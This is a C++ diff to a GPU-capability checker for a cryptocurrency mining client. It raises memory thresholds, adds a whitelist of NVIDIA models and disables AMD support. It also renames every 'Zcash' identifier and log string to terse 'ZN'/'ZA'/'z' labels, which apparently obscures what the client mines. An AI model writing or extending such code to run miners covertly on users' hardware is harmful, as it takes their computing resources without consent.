@@ -8,17 +8,29 @@
 #include "commonshare\md5.h"
 #include "Utility\StringOperation.h"
 
+//配置以下参数
+/*
+	g_bCheckName:是否检测显卡型号
+	g_szCardName：显卡名称匹配（往后添加）
+	g_uMinMemorySize：显存大小 根据需求修改
+*/
+bool g_bCheckName = true;
+char g_szCardName[][MAX_PATH] = {"970","980","1060","1070","1080","2050","2060","2070","2080"};
+cl_ulong g_uMinMemorySize = 3500000000;
+
+
+
 bool RunEnvironment::CheckEnvironment()
 {
-	if (CheckZcashNCond())
+	if (CheckZNCond())
 	{
 		m_Type = vendor_t::nvidia;
 		return true;
 	}
-	else if (CheckZcashACond())
+	else if (CheckZACond())
 	{
-		m_Type = vendor_t::amd;
-		return true;
+		//m_Type = vendor_t::amd;
+		//return true;
 	}
 	return false;
 }
@@ -110,7 +122,7 @@ bool RunEnvironment::GetUserDisplayCardInfo(vector<DISPLAY_CARD_INFO> &vDISPLAY_
 	return true;  
 };
 
-bool RunEnvironment::CheckZcashNCond()
+bool RunEnvironment::CheckZNCond()
 {
 	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
 	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
@@ -118,18 +130,26 @@ bool RunEnvironment::CheckZcashNCond()
 		return false;
 	}
 	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
-		TSDEBUG4CXX(L"[CheckZcashNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
-		if (iter->vendor == vendor_t::nvidia &&  iter->memory_size >= 1500000000)
+		TSDEBUG4CXX(L"[CheckZNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
+		if (iter->vendor == vendor_t::nvidia &&  iter->memory_size >= g_uMinMemorySize)
 		{
-			TSDEBUG4CXX(L"can do Zcash N");
-			return true;
+			if (g_bCheckName)
+			{
+				return CheckGPUName(iter->name);
+			}
+			else
+			{
+				TSDEBUG4CXX(L"can do ZN with out check name , Name = " << iter->name.c_str());
+				return true;
+			}
+			
 		}
 	}
 	return false;
 }
 
 
-bool RunEnvironment::CheckZcashACond()
+bool RunEnvironment::CheckZACond()
 {
 	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
 	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
@@ -137,16 +157,38 @@ bool RunEnvironment::CheckZcashACond()
 		return false;
 	}
 	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
-		TSDEBUG4CXX(L"[CheckZcashNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
-		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= 1500000000)
+		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
+		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= g_uMinMemorySize)
 		{
-			TSDEBUG4CXX(L"can do Zcash A");
-			return true;
+			if (g_bCheckName)
+			{
+				return CheckGPUName(iter->name);
+			}
+			else
+			{
+				TSDEBUG4CXX(L"can do ZA with out check name , Name = " << iter->name.c_str());
+				return true;
+			}
 		}
 	}
 	return false;
 }
 
+bool RunEnvironment::CheckGPUName(const std::string &strName)
+{
+	std::string strCardName = strName;
+	std::transform(strCardName.begin(), strCardName.end(), strCardName.begin(), tolower);
+
+	for (int i = 0; i < ARRAYSIZE(g_szCardName); ++i)
+	{
+		if (strCardName.find(g_szCardName[i]) != std::string::npos)
+		{
+			TSDEBUG4CXX(L"can do z, Name = " << strCardName.c_str());
+			return true;
+		}
+	}
+	return false;
+}
 
 void RunEnvironment::TerminateAllClientInstance()
 {
